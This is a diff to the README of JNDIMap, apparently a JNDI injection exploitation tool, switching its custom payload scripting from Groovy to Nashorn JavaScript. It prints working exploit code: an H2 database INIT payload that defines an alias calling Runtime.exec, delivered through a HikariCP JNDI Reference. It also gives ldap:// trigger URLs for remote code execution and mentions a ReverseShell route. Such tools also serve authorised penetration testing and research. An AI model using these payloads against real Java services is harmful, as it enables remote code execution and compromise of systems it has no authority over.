@@ -13,7 +13,7 @@ Features
 - NativeLibLoader (load native library)
 - MLet (detect classes in classpath)
 - LDAP(s) deserialization
-- custom JNDI payload (based on Groovy Language)
+- custom JNDI payload (based on Nashorn JS Engine)
 
 ## Build
 
@@ -47,7 +47,7 @@ Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-s <ldaps
 
 `-u`: specify the JNDI route manually, e.g. `/Basic/Command/open -a Calculator` (The JNDI URL is not completely controllable in some cases)
 
-`-f`: path to the Groovy script, used to write custom JNDI payloads
+`-f`: path to the JS script, used to write custom JNDI payloads
 
 `-useReferenceOnly`: only applicable to LDAP protocol, directly returns Reference object through LDAP related parameters, used to bypass `com.sun.jndi.ldap.object.trustSerialData`
 
@@ -390,45 +390,44 @@ ldap://127.0.0.1:1389/Deserialize/Fastjson2/ReverseShell/127.0.0.1/4444
 
 ### Script
 
-JNDIMap supports writing custom JNDI payload scripts with [Groovy](https://groovy-lang.org/) language
+JNDIMap supports writing custom JNDI payload scripts with the Nashorn JavaScript engine (based on ES5)
 
-Groovy script (using H2 RCE as an example)
+Take H2 RCE as an example
 
-```groovy
-import javax.naming.Reference
-import javax.naming.StringRefAddr
+```javascript
+var Reference = Java.type("javax.naming.Reference");
+var StringRefAddr = Java.type("javax.naming.StringRefAddr");
 
-def list = []
-list << "CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"test\"\\;}'"
-list << "CALL EXEC('$args')" // parameters are passed in through the args variable
+var list = [];
+list.push("CREATE ALIAS EXEC AS 'String cmd_exec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return \"test\";}'");
+list.push("CALL EXEC('" + args + "')"); // parameters are passed in through the args variable
 
+var url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=" + list.join(";") + ";";
 
-def url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=${list.join('\\;')}\\;"
+var ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null);
+ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
+ref.add(new StringRefAddr("jdbcUrl", url));
 
-def ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null)
-ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"))
-ref.add(new StringRefAddr("jdbcUrl", url))
-
-return ref // return Reference object
+ref; // return Reference object
 ```
 
 Start JNDIMap
 
 ```bash
-java -jar JNDIMap.jar -f /path/to/evil.groovy
+java -jar JNDIMap.jar -f /path/to/evil.js
 ```
 
 Achieve RCE via the following JNDI URL
 
 ```bash
-# supports passing parameters to Groovy scripts manually
+# supports passing parameters to JS script manually
 ldap://127.0.0.1:1389/Script/<args>
 ```
 
 In some cases, the JNDI URL is not completely controllable, so you can specify the `-u` parameter
 
 ```bash
-java -jar JNDIMap.jar -f /path/to/evil.groovy -u "/Script/open -a Calculator"
+java -jar JNDIMap.jar -f /path/to/evil.js -u "/Script/open -a Calculator"
 ```
 
 Then trigger via any JNDI URL
